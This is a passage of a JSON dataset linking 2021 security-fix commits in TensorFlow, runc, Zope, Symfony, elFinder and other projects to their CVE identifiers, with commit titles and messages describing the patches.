    "title": "Fix overflow CHECK issue with tf.raw_ops.AddManySparseToTensorsMap.",
    "body": "PiperOrigin-RevId: 369492969Change-Id: I1d70d6c0c92e3d7a25bc3b3aa2a0c0ac9688bf81",
    "cveIds": [
      "CVE-2021-29523"
    ],
    "cveIdsCount": 1
  },
  "8d74049dfa3b923b10fed387ef56d22cb3e8f4d6fca5bf294215d3a5b147da8e": {
    "url": "https://github.com/tensorflow/tensorflow/commit/e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd",
    "title": "Remove OP_REQUIRES call from helper function.",
    "body": "Since `OP_REQUIRES` macro expands to a `return;` (among other), calling it in a helper function only ends the helper function's execution earlier, but the kernel will still run from start to end. Thus, all the expected validations are actually broken/useless as the code ploughs through the next crash anyway.PiperOrigin-RevId: 369524386Change-Id: I54f6cf9328445675ccc392e661b04336b229c9da",
    "cveIds": [
      "CVE-2021-29530"
    ],
    "cveIdsCount": 1
  },
  "9037f345315ffd0c33948d208aac6c8798b6050ea0815e963d01368a028ab337": {
    "url": "https://github.com/tensorflow/tensorflow/commit/44b7f486c0143f68b56c34e2d01e146ee445134a",
    "title": "Fix out of bounds read in ragged_cross_op.cc.",
    "body": "PiperOrigin-RevId: 369757702Change-Id: Ie6e5d2c21513a8d56bf41fcf35960caf76e890f9",
    "cveIds": [
      "CVE-2021-29532"
    ],
    "cveIdsCount": 1
  },
  "c9fc7971893a1c5729329c3353bad106e2fd4881e26ccb222030f99a27057476": {
    "url": "https://github.com/tensorflow/tensorflow/commit/efea03b38fb8d3b81762237dc85e579cc5fc6e87",
    "title": "Validate inputs to QuantizedMul",
    "body": "PiperOrigin-RevId: 369756982Change-Id: I00d960cc3b9316fd7a86bd37a44e341c96e17624",
    "cveIds": [
      "CVE-2021-29535"
    ],
    "cveIdsCount": 1
  },
  "474cb8a2633da7f66a1cfc05e094a468b6ff8196e17a5fdde4d6036d3311801e": {
    "url": "https://github.com/tensorflow/tensorflow/commit/a324ac84e573fba362a5e53d4e74d5de6729933e",
    "title": "Validate arguments to QuantizedReshape.",
    "body": "Ensure that validations from `Reshape` also terminate `QuantizedReshape` on failure.PiperOrigin-RevId: 369775421Change-Id: If8c5342267aceea65b7cb83a4b183304886f1ce8",
    "cveIds": [
      "CVE-2021-29536"
    ],
    "cveIdsCount": 1
  },
  "1f200a184f3d99ded87663e2cb427d6eca5eaf4c382fee6cd47d4b6893e4f12a": {
    "url": "https://github.com/tensorflow/tensorflow/commit/f6c40f0c6cbf00d46c7717a26419f2062f2f8694",
    "title": "Validate min and max arguments to QuantizedResizeBilinear.",
    "body": "PiperOrigin-RevId: 369765091Change-Id: I33be8b78273ab7d08b97541692fe05cb7f94963a",
    "cveIds": [
      "CVE-2021-29537"
    ],
    "cveIdsCount": 1
  },
  "15d78bfaf0b05831e0fbcb9ed7415f383428af7eb56fb30d346a14cdb5215f77": {
    "url": "https://github.com/tensorflow/tensorflow/commit/c570e2ecfc822941335ad48f6e10df4e21f11c96",
    "title": "Fix issues in Conv2DBackpropFilter.",
    "body": "PiperOrigin-RevId: 369772454Change-Id: I49b465f2ae2ce91def61b56cea8000197d5177d8",
    "cveIds": [
      "CVE-2021-29540"
    ],
    "cveIdsCount": 1
  },
  "a2a6441ae2d8f04c15895ec11b852590bd2835a7467c7be2e362a7f8ecd63355": {
    "url": "https://github.com/tensorflow/tensorflow/commit/ba424dd8f16f7110eea526a8086f1a155f14f22b",
    "title": "Enhance validation of ngram op and handle case of 0 tokens.",
    "body": "PiperOrigin-RevId: 369940178Change-Id: Ia82f42c09d14efe76e7dc013505b832a42282f0b",
    "cveIds": [
      "CVE-2021-29541"
    ],
    "cveIdsCount": 1
  },
  "908ded911bdc87600e902ed4e05168468c78a12bd78c11910c6ced935909fdcb": {
    "url": "https://github.com/tensorflow/tensorflow/commit/d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b",
    "title": "Add missing validation in QuantizedBatchNormWithGlobalNormalization",
    "body": "PiperOrigin-RevId: 370123451Change-Id: Id234d6dab1ec21230bb8e503dba30f899af87f33",
    "cveIds": [
      "CVE-2021-29547"
    ],
    "cveIdsCount": 1
  },
  "415cd9af1276cf97d75816fe7b2d2f530d400bc586368d648ac1190ec3e12b3c": {
    "url": "https://github.com/tensorflow/tensorflow/commit/480641e3599775a8895254ffbc0fc45621334f68",
    "title": "Validate (and ensure validation sticks) inputs for `MatrixTriangularS…",
    "body": "…olve`.PiperOrigin-RevId: 370282444Change-Id: Iaed61a0b0727cc42c830658b72eb69f785f48dc5",
    "cveIds": [
      "CVE-2021-29551"
    ],
    "cveIdsCount": 1
  },
  "1c763bfc6cb44025160f45f054acdd6d69dde46b519713e226db0d8a2bc4602b": {
    "url": "https://github.com/tensorflow/tensorflow/commit/99085e8ff02c3763a0ec2263e44daec416f6a387",
    "title": "Fix tf.raw_ops.QuantizeAndDequantizeV3 array index failure.",
    "body": "PiperOrigin-RevId: 370577691Change-Id: Ifeae64212f6bcd139435824fa2748d1329213c4c",
    "cveIds": [
      "CVE-2021-29553"
    ],
    "cveIdsCount": 1
  },
  "7ac6e83adafd3fedbf9434a282afc8fec5e579710be7ff2c80353ab1fac6203c": {
    "url": "https://github.com/tensorflow/tensorflow/commit/8ba6fa29cd8bf9cef9b718dc31c78c73081f5b31",
    "title": "Fix heap-buffer-overflow issue with tf.raw_ops.SparseSplit.",
    "body": "PiperOrigin-RevId: 371242872Change-Id: I482bb3d12602c7c3cc9446f97fb9f584bb98e9a4",
    "cveIds": [
      "CVE-2021-29558"
    ],
    "cveIdsCount": 1
  },
  "067f6db3e4a8513a61cde163a195b3b65564eed4bac0e20b0425d84e9482026a": {
    "url": "https://github.com/tensorflow/tensorflow/commit/51300ba1cc2f487aefec6e6631fef03b0e08b298",
    "title": "Fix heap buffer overflow in tf.raw_ops.UnicodeEncode.",
    "body": "PiperOrigin-RevId: 371717714Change-Id: If33443b28f158e58078f1268f6b92f2728d219e0",
    "cveIds": [
      "CVE-2021-29559"
    ],
    "cveIdsCount": 1
  },
  "eb1e647c8badd6ec0331ca6f77250a8e037375a7ecf4be42a9effb60624e24db": {
    "url": "https://github.com/tensorflow/tensorflow/commit/a84358aa12f0b1518e606095ab9cfddbf597c121",
    "title": "Fix heap-buffer-overflow issue with tf.raw_ops.RaggedTensorToTensor.",
    "body": "PiperOrigin-RevId: 371986929Change-Id: I79ab962a22c5867f36f7f45b780a1ac881b1dbdd",
    "cveIds": [
      "CVE-2021-29560"
    ],
    "cveIdsCount": 1
  },
  "9bd0f4aa36edf009b47c35282d764e15559554952e167f271b185988dd573ffb": {
    "url": "https://github.com/tensorflow/tensorflow/commit/f4c364a5d6880557f6f5b6eb5cee2c407f0186b3",
    "title": "Fix multiple issues in EditDistance",
    "body": "PiperOrigin-RevId: 372033948Change-Id: Ieb957c29894af05bdfeb1a0402fced808dfcfd7b",
    "cveIds": [
      "CVE-2021-29564"
    ],
    "cveIdsCount": 1
  },
  "f3f5a922474086a4e3d4a5862ffb84e5c290092ca7a78b9cc7f7ec3446cb5c46": {
    "url": "https://github.com/tensorflow/tensorflow/commit/faa76f39014ed3b5e2c158593b1335522e573c7f",
    "title": "Fix heap-buffer-overflow issue with tf.raw_ops.SparseFillEmptyRows.",
    "body": "PiperOrigin-RevId: 372009178Change-Id: Ia1a9e9691ecaa072f32fb39a0887b2aabd399210",
    "cveIds": [
      "CVE-2021-29565"
    ],
    "cveIdsCount": 1
  },
  "0fecfc6d44c687e77fd25f7463aab0b725f65c05b7c5025415bbee6959628be4": {
    "url": "https://github.com/tensorflow/tensorflow/commit/3f6fe4dfef6f57e768260b48166c27d148f3015f",
    "title": "Add missing validations in dillation ops.",
    "body": "PiperOrigin-RevId: 372037158Change-Id: I4ee304c84a02550c030288a6534000b934fc1599",
    "cveIds": [
      "CVE-2021-29566"
    ],
    "cveIdsCount": 1
  },
  "1a396aaf8274628d6811ea2fe913f311cd9349ba2d579bb8a98d98ba7f65ddb6": {
    "url": "https://github.com/tensorflow/tensorflow/commit/ef0c008ee84bad91ec6725ddc42091e19a30cf0e",
    "title": "Fix out of bound read in requantization_range_op.cc",
    "body": "PiperOrigin-RevId: 372129031Change-Id: Ie684ab98a3840c5186ead3eafffc0e0ed0e8030d",
    "cveIds": [
      "CVE-2021-29569"
    ],
    "cveIdsCount": 1
  },
  "8140c290764b0d4f0459d4990d438c94301dd2d3121a951737726c8b2999d03f": {
    "url": "https://github.com/tensorflow/tensorflow/commit/dcd7867de0fea4b72a2b34bd41eb74548dc23886",
    "title": "Fix heap buffer overflow",
    "body": "PiperOrigin-RevId: 372132844Change-Id: Idef9895efaf145f2b1c23d31983601ec980cd5e4",
    "cveIds": [
      "CVE-2021-29570"
    ],
    "cveIdsCount": 1
  },
  "78bab1dfa7bab9e0983e05ca776e0fc0cdcae35edb33e248ccad29961c4ded32": {
    "url": "https://github.com/tensorflow/tensorflow/commit/79865b542f9ffdc9caeb255631f7c56f1d4b6517",
    "title": "Fix memory corruption issue with tf.raw_ops.DrawBoundingBoxesV2.",
    "body": "PiperOrigin-RevId: 372033910Change-Id: I8a9f4efc1c8ddaacbc26ec1fbe4bfdd6791c226d",
    "cveIds": [
      "CVE-2021-29571"
    ],
    "cveIdsCount": 1
  },
  "4bde8d4995827db8d4746a09570006a4a74399dc0231df50d869749c569dea20": {
    "url": "https://github.com/tensorflow/tensorflow/commit/f7cc8755ac6683131fdfa7a8a121f9d7a9dec6fb",
    "title": "Add several missing validations in SDCA",
    "body": "PiperOrigin-RevId: 372172877Change-Id: Id366da962432e18dcbfac847d11e98488bebb70a",
    "cveIds": [
      "CVE-2021-29572"
    ],
    "cveIdsCount": 1
  },
  "7b917b6fce1c63517cf8a1ba9278315cdf1d90c43c0880d5f0b752d7a465ae35": {
    "url": "https://github.com/tensorflow/tensorflow/commit/a3d9f9be9ac2296615644061b40cefcee341dcc4",
    "title": "Add missing validation to pooling_ops_3d",
    "body": "PiperOrigin-RevId: 372218727Change-Id: I6b9ed4266aa7286c02f1f230d7bea922c1be547e",
    "cveIds": [
      "CVE-2021-29574"
    ],
    "cveIdsCount": 1
  },
  "881898dd70060f051348096a4cbdfbfaafd20f5a9e4af23ed915bd8dbe7f81b8": {
    "url": "https://github.com/tensorflow/tensorflow/commit/63c6a29d0f2d692b247f7bf81f8732d6442fad09",
    "title": "Add missing validation, prevent heap OOB",
    "body": "PiperOrigin-RevId: 372246723Change-Id: I1a454a643810e77d7d14821b342098c56a09fbbf",
    "cveIds": [
      "CVE-2021-29576"
    ],
    "cveIdsCount": 1
  },
  "6488fe967b04de9c4a2513566d843b2150a4818dae77017e63736cafb54dba41": {
    "url": "https://github.com/tensorflow/tensorflow/commit/6fc9141f42f6a72180ecd24021c3e6b36165fe0d",
    "title": "Fix assertion failure in pooling_ops_3d",
    "body": "PiperOrigin-RevId: 372364504Change-Id: Iecde4fe26b47a8fa935d6e2611b5585ed5777781",
    "cveIds": [
      "CVE-2021-29577"
    ],
    "cveIdsCount": 1
  },
  "a9234610af66ce699cb69352b31b095f51152ff6f0986448ba357a8c611f1851": {
    "url": "https://github.com/tensorflow/tensorflow/commit/12c727cee857fa19be717f336943d95fca4ffe4f",
    "title": "Validate inputs of FractionalAvgPoolGrad.",
    "body": "PiperOrigin-RevId: 372420640Change-Id: Icc583928e6cdc3062e12498e4d2337a8fe3da016",
    "cveIds": [
      "CVE-2021-29578"
    ],
    "cveIdsCount": 1
  },
  "3eb60292150ec1a0a2ba32299592fc45158e0fb2ef147b0c58c394e396510ec8": {
    "url": "https://github.com/tensorflow/tensorflow/commit/a74768f8e4efbda4def9f16ee7e13cf3922ac5f7",
    "title": "Prevent heap OOB error in MaxPoolGrad",
    "body": "PiperOrigin-RevId: 372424854Change-Id: Idac0f23867ad8b0601cafbaaa52d5e64269e63a7",
    "cveIds": [
      "CVE-2021-29579"
    ],
    "cveIdsCount": 1
  },
  "fa4b92dfbeab00e8cba2aff1271a9cef98781273740f8fd0195f2758fd4baa5e": {
    "url": "https://github.com/tensorflow/tensorflow/commit/5899741d0421391ca878da47907b1452f06aaf1b",
    "title": "Fix heap OOB read in dequantize op.",
    "body": "Also fixes SEGV in same opPiperOrigin-RevId: 372437896Change-Id: I135e94d360c2a1ce374c10f7e0fed1af603dbc02",
    "cveIds": [
      "CVE-2021-29582"
    ],
    "cveIdsCount": 1
  },
  "46e91d377d13af96ead48d0b3aadf889b454e0fe65a73912b4ee2aaa026930b7": {
    "url": "https://github.com/tensorflow/tensorflow/commit/6972f9dfe325636b3db4e0bc517ee22a159365c0",
    "title": "Add missing valuidation to FusedBatchNorm.",
    "body": "PiperOrigin-RevId: 372460336Change-Id: Ic8c4e4de67c58a741bd87f2e182bed07247d1126",
    "cveIds": [
      "CVE-2021-29583"
    ],
    "cveIdsCount": 1
  },
  "2dcefdc5bb759e806091fad5aeda62ef9b1a93e334b0cddc08d47bcfc6ed5a2f": {
    "url": "https://github.com/tensorflow/tensorflow/commit/4c0ee937c0f61c4fc5f5d32d9bb4c67428012a60",
    "title": "Prevent overflow in sparse op",
    "body": "PiperOrigin-RevId: 372442006Change-Id: I60fe31cd7e56fb3501e97c63500caf902ddeee96",
    "cveIds": [
      "CVE-2021-29584"
    ],
    "cveIdsCount": 1
  },
  "a7763b1f54397e6bcc1ba0a38e86f8964ca9058bf6554be0f53778e9acefd2d7": {
    "url": "https://github.com/tensorflow/tensorflow/commit/953f28dca13c92839ba389c055587cfe6c723578",
    "title": "Prevent a null pointer exception in TFLite",
    "body": "PiperOrigin-RevId: 370800206Change-Id: Idd437ebce4ff224120d8eefc1c14c062173b71d6",
    "cveIds": [
      "CVE-2021-29590"
    ],
    "cveIdsCount": 1
  },
  "a562f16f1c2bd19ed65014c7aca8db2bf0b30005245fdaa5824167e645cda65f": {
    "url": "https://github.com/tensorflow/tensorflow/commit/f8378920345f4f4604202d4ab15ef64b2aceaa16",
    "title": "Prevent a null pointer dereference in TFLite.",
    "body": "PiperOrigin-RevId: 370800353Change-Id: Ic9c9712ce5c6e384c954dcd640a5bd9ff05c9a05",
    "cveIds": [
      "CVE-2021-29592"
    ],
    "cveIdsCount": 1
  },
  "6fe9da52279bcbe37bef43ad87d0fceef9dcea0ea607d7aa4d8c1c81e9c596ed": {
    "url": "https://github.com/tensorflow/tensorflow/commit/4253f96a58486ffe84b61c0415bb234a4632ee73",
    "title": "Fix integer overflow in TFLite concat",
    "body": "PiperOrigin-RevId: 371013841Change-Id: I6a4782ce7ca753e23ff31e7fb6aeb7f9d412cd29",
    "cveIds": [
      "CVE-2021-29601"
    ],
    "cveIdsCount": 1
  },
  "f666311eef0d486bd2f9cba9ddf8aaeb5b2fdb25051ab74674e93a2e2310a095": {
    "url": "https://github.com/tensorflow/tensorflow/commit/c59c37e7b2d563967da813fa50fe20b21f4da683",
    "title": "Prevent array write out-of-bounds.",
    "body": "If user passes an invalid axis, then we copy one too many dimensions to the output in the loop below these checks. Even if we didn't do that, there will be further issues with an invalid axis, so we check for that right now.PiperOrigin-RevId: 371023299Change-Id: I9eca37ffc2b29e8e48710f500701270ef0790224",
    "cveIds": [
      "CVE-2021-29603"
    ],
    "cveIdsCount": 1
  },
  "d47417ca4a12176f49534cfc735da66c09c2376c5b24098470dc200e0f3bd1b7": {
    "url": "https://github.com/tensorflow/tensorflow/commit/7c8cc4ec69cd348e44ad6a2699057ca88faad3e5",
    "title": "Fix a dangerous integer overflow and a malloc of negative size.",
    "body": "PiperOrigin-RevId: 371254154Change-Id: I250a98a3df26328770167025670235a963a72da0",
    "cveIds": [
      "CVE-2021-29605"
    ],
    "cveIdsCount": 1
  },
  "769e87e61b3af4ae76f511ec5e07233bc2e89ccc90ebb385a6ea426061f9f884": {
    "url": "https://github.com/tensorflow/tensorflow/commit/ae2daeb45abfe2c6dda539cf8d0d6f653d3ef412",
    "title": "Prevent array OOB read/write",
    "body": "PiperOrigin-RevId: 371026165Change-Id: I26ac6372c87246e03c7eb8c94e84c84d86054b36",
    "cveIds": [
      "CVE-2021-29606"
    ],
    "cveIdsCount": 1
  },
  "cf7d2b9ab489e3424a64e203af5e759f8d6f537963b526b99ea04f7e8092cfa6": {
    "url": "https://github.com/tensorflow/tensorflow/commit/41727ff06111117bdf86b37db198217fd7a143cc",
    "title": "Validate that a and b are proper sparse tensors",
    "body": "PiperOrigin-RevId: 373248068Change-Id: I0a2041a0747901b3f00387a6a3bce9bca6b0b3b1",
    "cveIds": [
      "CVE-2021-29609"
    ],
    "cveIdsCount": 1
  },
  "02d1345a27e511f31bc660843e7158a3884c68049c105654f19bb32ae36997d1": {
    "url": "https://github.com/tensorflow/tensorflow/commit/6fd02f44810754ae7481838b6a67c5df7f909ca3",
    "title": "Fix tf.raw_ops.SparseAdd invalid memory access failure.",
    "body": "PiperOrigin-RevId: 370568774Change-Id: I5f73b31c865f2948a1c8dfb7ebd22b3cfb6405bf",
    "cveIds": [
      "CVE-2021-29609"
    ],
    "cveIdsCount": 1
  },
  "474055536c40a2b5c7cf0b7c1a8335b285981f6277ea59f7b4f8e4458a7eb25c": {
    "url": "https://github.com/tensorflow/tensorflow/commit/1d04d7d93f4ed3854abf75d6b712d72c3f70d6b6",
    "title": "Fix heap-buffer-overflow issue with tf.raw_ops.SparseReshape.",
    "body": "PiperOrigin-RevId: 371218558Change-Id: I6a6dc5bf15b50a1d05bdd95e9ba347cb39f40f45",
    "cveIds": [
      "CVE-2021-29611"
    ],
    "cveIdsCount": 1
  },
  "29ddb26d548dc54d54ce65e1a641c25feb34af6b0b39c11288fa93da42bdda7b": {
    "url": "https://github.com/tensorflow/tensorflow/commit/e6340f0665d53716ef3197ada88936c2a5f7a2d3",
    "title": "Handle a special grappler case resulting in crash.",
    "body": "It might happen that a malformed input could be used to trick Grappler into trying to optimize a node with no inputs. This, in turn, would produce a null pointer dereference and a segfault.PiperOrigin-RevId: 369242852Change-Id: I2e5cbe7aec243d34a6d60220ac8ac9b16f136f6b",
    "cveIds": [
      "CVE-2021-29616"
    ],
    "cveIdsCount": 1
  },
  "ee97136c257432c85efd2176956d57148863467ee867343b521ddf07cf082d74": {
    "url": "https://github.com/michaelforney/samurai/commit/e84b6d99c85043fa1ba54851ee500540ec206918",
    "title": "util: Check for NULL string in writefile",
    "body": "This check was there previously, but was removed in f549b75 withthe addition of a check during parse that every rule has rspfileif and only if it has rspfile_content. However, this fails toconsider the possibility of those variables coming from the edgeor global environment. So, re-add the check.Fixes #67.",
    "cveIds": [
      "CVE-2021-30218"
    ],
    "cveIdsCount": 1
  },
  "199a37f0939c54dd2cdbf0b602cf988b535558a096083549135a595452e5abd1": {
    "url": "https://github.com/michaelforney/samurai/commit/d2af3bc375e2a77139c3a28d6128c60cd8d08655",
    "title": "parse: Check for non-empty command/rspfile/rspfile_content",
    "body": "This matches ninja behavior and prevents the possibility of a rulewith an empty (NULL) command string.Fixes #68.",
    "cveIds": [
      "CVE-2021-30219"
    ],
    "cveIdsCount": 1
  },
  "ababdfa15823373a48fe19e77ed6455177380e226aad1b59e876a27cb47849bb": {
    "url": "https://github.com/jazzband/django-debug-toolbar/releases",
    "title": "3.2.1 … 2.2.1 … 1.11.1 … 3.2 … 3.2a1 … 3.1.1 … 3.1 … 3.0 … 3.0a4 … 3.0a3 …",
    "body": "Fix CVE-2021-30459 by creating signature from all data fields. Fix CVE-2021-30459 by creating signature from all data fields. Fix CVE-2021-30459 by creating signature from all data fields. django-debug-toolbar 3.2 django-debug-toolbar 3.2a1 django-debug-toolbar 3.1.1 django-debug-toolbar 3.1 django-debug-toolbar 3.0 django-debug-toolbar 3.0a4 django-debug-toolbar 3.0a3",
    "cveIds": [
      "CVE-2021-30459"
    ],
    "cveIdsCount": 1
  },
  "bfd0b5a65bbf52bfd43902f9d7391176511bb62045e4737f67b7841d9e1bfc53": {
    "url": "https://github.com/opencontainers/runc/commit/0ca91f44f1664da834bc61115a849b56d22f595f",
    "title": "rootfs: add mount destination validation",
    "body": "Because the target of a mount is inside a container (which may be avolume that is shared with another container), there exists a racecondition where the target of the mount may change to a path containinga symlink after we have sanitised the path -- resulting in usinadvertently mounting the path outside of the container.This is not immediately useful because we are in a mount namespace withMS_SLAVE mount propagation applied to \"/\", so we cannot mount on top ofhost paths in the host namespace. However, if any subsequent mountpointsin the configuration use a subdirectory of that host path as a source,those subsequent mounts will use an attacker-controlled source path(resolved within the host rootfs) -- allowing the bind-mounting of \"/\"into the container.While arguably configuration issues like this are not entirely withinrunc's threat model, within the context of Kubernetes (and possiblyother container managers that provide semi-arbitrary container creationprivileges to untrusted users) this is a legitimate issue. Since wecannot block mounting from the host into the container, we need to blockthe first stage of this attack (mounting onto a path outside thecontainer).The long-term plan to solve this would be to migrate to libpathrs, butas a stop-gap we implement libpathrs-like path verification throughreadlink(/proc/self/fd/$n) and then do mount operations through theprocfd once it's been verified to be inside the container. The targetcould move after we've checked it, but if it is inside the containerthen we can assume that it is safe for the same reason that libpathrsoperations would be safe.A slight wrinkle is the \"copyup\" functionality we provide for tmpfs,which is the only case where we want to do a mount on the hostfilesystem. To facilitate this, I split out the copy-up functionalityentirely so that the logic isn't interspersed with the regular tmpfslogic. In addition, all dependencies on m.Destination being overwrittenhave been removed since that pattern was just begging to be a source ofmore mount-target bugs (we do still have to modify m.Destination fortmpfs-copyup but we only do it temporarily).Fixes: CVE-2021-30465Reported-by: Etienne Champetier <champetier.etienne@gmail.com>Co-authored-by: Noah Meyerhans <nmeyerha@amazon.com>Reviewed-by: Samuel Karp <skarp@amazon.com>Reviewed-by: Kir Kolyshkin <kolyshkin@gmail.com> (@kolyshkin)Reviewed-by: Akihiro Suda <akihiro.suda.cz@hco.ntt.co.jp>Signed-off-by: Aleksa Sarai <cyphar@cyphar.com>",
    "cveIds": [
      "CVE-2021-30465"
    ],
    "cveIdsCount": 1
  },
  "d7c0ebb7e42b0fb957aea9d2c0c4f8492a3d14eb05edea17384b37f4be0e24d2": {
    "url": "https://github.com/upx/upx/commit/90279abdfcd235172eab99651043051188938dcc",
    "title": "PackLinuxElf::canUnpack must checkEhdr() for ELF input",
    "body": "#485modified: p_lx_elf.cpp",
    "cveIds": [
      "CVE-2021-30500"
    ],
    "cveIdsCount": 1
  },
  "11b5b7190812b3d5bd0f4b466aacc6a7ae9f43fba85348c721ae3c3057aeef2b": {
    "url": "https://github.com/upx/upx/commit/28e761cd42211dfe0124b7a29b2f74730f453e46",
    "title": "Merge pull request #487 from chibataiki/devel",
    "body": "Complain when Mach_header.sizeofcmds == 0#487",
    "cveIds": [
      "CVE-2021-30501"
    ],
    "cveIdsCount": 1
  },
  "bcdcfa7c89b914dfc2051244c48ec533df9811cc6c99389b1ddd4a4a5137e859": {
    "url": "https://github.com/zopefoundation/Zope/commit/1f8456bf1f908ea46012537d52bd7e752a532c91",
    "title": "Merge pull request from GHSA-5pr9-v234-jw36",
    "body": "* - Prevent traversal to names starting with ``_`` in TAL expressions* - include the expressions module* - simplify test* - lint fix* - add DeprecationWarnings for traversal to `_`* Update src/Products/PageTemplates/tests/testChameleonTalesExpressions.pyCo-authored-by: Michael Howitz <mh@gocept.com>* - add missing import* - added tests for the ``traverse`` method fix* - change control flowCo-authored-by: Michael Howitz <mh@gocept.com>",
    "cveIds": [
      "CVE-2021-32633"
    ],
    "cveIdsCount": 1
  },
  "c86e91b2898f4e9cd3475cda907448676e1d0ed4d90eb3260677ec6ebfe8979c": {
    "url": "https://github.com/authelia/authelia/commit/c62dbd43d6e69ae81530e7c4f8763857f8ff1dda",
    "title": "fix(handlers): align response status codes for the verify endpoint (#…",
    "body": "…2016)This aligns all response status codes on the /api/verify endpoint when an error occurs, making it impossible to determine the actual reason for the failure.",
    "cveIds": [
      "CVE-2021-32637"
    ],
    "cveIdsCount": 1
  },
  "b3615b7f09cbaec33c21862e007aa84ef05109c83d99f88f30bdaa4121efcd2b": {
    "url": "https://github.com/github/codeql-action/commit/58defc0652e935f6f2ffc70a82828b98d75476fb",
    "title": "Remove --external-repository-token option from runner",
    "body": "Specifying a token as a cli input leads to a potential for leaking thetoken on CI logs. This commit removes the option. Instead, usersshould specify a single GitHub token through `--github-auth-stdin` orby setting the `GITHUB_TOKEN` environment variable. This token should becreated with enough privileges to access the required repository.",
    "cveIds": [
      "CVE-2021-32638"
    ],
    "cveIdsCount": 1
  },
  "c7895308ad7c92d34a27f209c2201184a888fd73a162dfd188136a80d555de7f": {
    "url": "https://github.com/github/codeql-action/commit/88714e3a60e72ec53caa0e6a203652ee1f3fb1db",
    "title": "Add capability to specify auth from env var or stdin",
    "body": "This commit adds two new ways of specifying GitHub auth:1. from the GITHUB_TOKEN environment variable2. from standard inputThis commit does not include any documentation changes and thedescriptions of new command line options will need to be tweaked.",
    "cveIds": [
      "CVE-2021-32638"
    ],
    "cveIdsCount": 1
  },
  "9f01891a7823fcd40ee4f3d84280e791f364111240ec1045b6948152589fd820": {
    "url": "https://github.com/auth0/lock/commit/d139cf01c8234b07caf265e051f39d3eab08f7ed",
    "title": "Merge pull request from GHSA-jr3j-whm4-9wwm",
    "body": "* Convert svg strings to elements* Sanitizing usage of dangerouslySetInnerHTMLCo-authored-by: David <david.patrick@auth0.com>",
    "cveIds": [
      "CVE-2021-32641"
    ],
    "cveIdsCount": 1
  },
  "cfbe09e694316a9d707a7a6b1293ca3173800959f4c70f102273642f64d57a8f": {
    "url": "https://github.com/nextcloud/android/commit/355f3c745b464b741b20a3b96597303490c26333",
    "title": "check e2e keys",
    "body": "Signed-off-by: tobiasKaminsky <tobias@kaminsky.me>",
    "cveIds": [
      "CVE-2021-32658"
    ],
    "cveIdsCount": 1
  },
  "2c37f587ea66bbc1db100709ef2c5f16a45572c4124bc417ccc4eb32e06abb05": {
    "url": "https://github.com/backstage/backstage/commit/8cefadca04cbf01d0394b0cb1983247e5f1d6208",
    "title": "Add validation to prevent docs_dir from being an absolute path",
    "body": "* Adds a new validation function to helpers to prevent generation when mkdocs.yml is not present or is invalid* Handles vulnerability where docs_dir can be put in as an absolute path which copies and exposes the files from that absolute path in the file systemSigned-off-by: Jussi Hallila <jussi@hallila.com>",
    "cveIds": [
      "CVE-2021-32662"
    ],
    "cveIdsCount": 1
  },
  "7f4eb7bd760828875222f30e43567576a3d0dd8a6bc64979917cf08ecbe28ecd": {
    "url": "https://github.com/reg-viz/reg-suit/commit/f84ad9c7a22144d6c147dc175c52756c0f444d87",
    "title": "Merge pull request from GHSA-49q3-8867-5wmp",
    "body": "fix: Escape shell string",
    "cveIds": [
      "CVE-2021-32673"
    ],
    "cveIdsCount": 1
  },
  "07fdfc7005e26872703323a7de5970beb6d25968f57184b6fad694cca4feea79": {
    "url": "https://github.com/zopefoundation/Zope/commit/1d897910139e2c0b11984fc9b78c1da1365bec21",
    "title": "Merge pull request from GHSA-rpcg-f9q6-2mq6",
    "body": "* - Prevent traversal through authorized Python modules in TAL expressions* - try a more generic solution that doesn't use special casing* - add suggestions from Maurits* - integrate remaining suggestions from Maurits",
    "cveIds": [
      "CVE-2021-32674"
    ],
    "cveIdsCount": 1
  },
  "d42a553e23fa94550d1f1bbc60ea79f6373e77151ae390009dd71ceebfdb2e6a": {
    "url": "https://github.com/tiangolo/fastapi/commit/fa7e3c996edf2d5482fff8f9d890ac2390dede4d",
    "title": "🐛 Check Content-Type request header before assuming JSON (#2118)",
    "body": "Co-authored-by: Patrick Wang <patrickkwang@users.noreply.github.com>Co-authored-by: Sebastián Ramírez <tiangolo@gmail.com>",
    "cveIds": [
      "CVE-2021-32677"
    ],
    "cveIdsCount": 1
  },
  "4816e98f8371783be3636247c7fcaac9b22535f5148efe9721ec7fc730dc8ba9": {
    "url": "https://github.com/Studio-42/elFinder/commit/a106c350b7dfe666a81d6b576816db9fe0899b17",
    "title": "Merge pull request from GHSA-wph3-44rj-92pr",
    "body": "* [php] fix multiple vulnerabilities* fix archiver args* fix remote Code Execution of zip command* re-fix remote Code Execution of zip command* re-fix Improper hostname validation in upload and put* re-fix Directory traversal in the actions mkfile and mkdir* Add check targets in archive()",
    "cveIds": [
      "CVE-2021-32682"
    ],
    "cveIdsCount": 1
  },
  "c1516ada9a3ebefca3d6f1b0416804b8162bf094c31a3136910d50f54fb820f6": {
    "url": "https://github.com/ApollosProject/apollos-apps/commit/cb5f8f1c0b24f1b215b2bb5eb6f9a8e16d728ce2",
    "title": "fix: turns off automerging new people (#1989)",
    "body": "* fix: turns off automerging new people* fix* tests and snaps",
    "cveIds": [
      "CVE-2021-32691"
    ],
    "cveIdsCount": 1
  },
  "97dbc095bbe513e3bc92deb20b3d89f494a12eac86b2aa14e41e3965808b58cf": {
    "url": "https://github.com/symfony/symfony/commit/3084764ad82f29dbb025df19978b9cbc3ab34728",
    "title": "Only trigger for the correct firewall in ContextListener::onKernelRes…",
    "body": "…ponse()",
    "cveIds": [
      "CVE-2021-32693"
    ],
    "cveIdsCount": 1
  },
  "38eaff834b3c82bbf635601cc735cafc7e8347104b5482d10b3d1c91480d9492": {
    "url": "https://github.com/symfony/security-http/commit/6bf4c31219773a558b019ee12e54572174ff8129",
    "title": "security #cve-2021-32693 [SecurityHttp] Fix \"Authentication granted w…",
    "body": "…ith multiple firewalls\" (wouterj)This PR was merged into the 5.3 branch.",
    "cveIds": [
      "CVE-2021-32693"
    ],
    "cveIdsCount": 1
  },
  "910a935ae28e29b85db1545402c6de72ddd97534c5cefe696ce7921d51fee8a2": {
    "url": "https://github.com/neos/form/commit/69de4219b1f58157e2be6b05811463875d75c246",
    "title": "Merge pull request from GHSA-m5vx-8chx-qvmm",
    "body": "BUGFIX: Don't skip validators for GET requests",
    "cveIds": [
      "CVE-2021-32697"
    ],
    "cveIdsCount": 1
  },
